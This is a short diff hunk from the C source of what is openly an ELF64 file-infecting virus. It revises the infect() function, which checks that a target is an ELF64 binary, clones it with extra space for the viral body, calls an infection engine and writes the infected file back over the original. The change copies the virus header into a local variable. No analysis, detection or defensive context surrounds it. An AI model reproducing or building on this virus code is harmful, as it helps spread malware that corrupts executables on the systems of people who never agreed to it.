@@ -48,18 +48,18 @@ static bool	is_elf64(const char *file)
 
 inline bool	infect(struct virus_header *vhdr, const char *file)
 {
-	struct safe_ptr	original_ref = {.ptr = NULL, .size = 0};
-	struct safe_ptr	clone_ref    = {.ptr = NULL, .size = 0};
-	size_t		virus_size   = vhdr->virus_size;
-	size_t		extra_size   = virus_size * 2;
+	struct safe_ptr		original_ref = {.ptr = NULL, .size = 0};
+	struct safe_ptr		clone_ref    = {.ptr = NULL, .size = 0};
+	struct virus_header	local_vhdr   = *vhdr;
+	size_t			extra_size   = local_vhdr.virus_size * 2;
 
 	log_try_infecting(file);
 
 	if (!is_elf64(file)
 	|| !init_original_safe(&original_ref, file)
 	|| !init_clone_safe(&clone_ref, original_ref.size, extra_size)
-	|| !infection_engine(vhdr, clone_ref, original_ref)
-	|| !write_file((struct safe_ptr){clone_ref.ptr, original_ref.size + ALIGN(vhdr->virus_size, PAGE_ALIGNMENT)}, file))
+	|| !infection_engine(&local_vhdr, clone_ref, original_ref)
+	|| !write_file((struct safe_ptr){clone_ref.ptr, original_ref.size + ALIGN(local_vhdr.virus_size, PAGE_ALIGNMENT)}, file))
 	{
 		free_accessor(&original_ref);
 		free_accessor(&clone_ref);
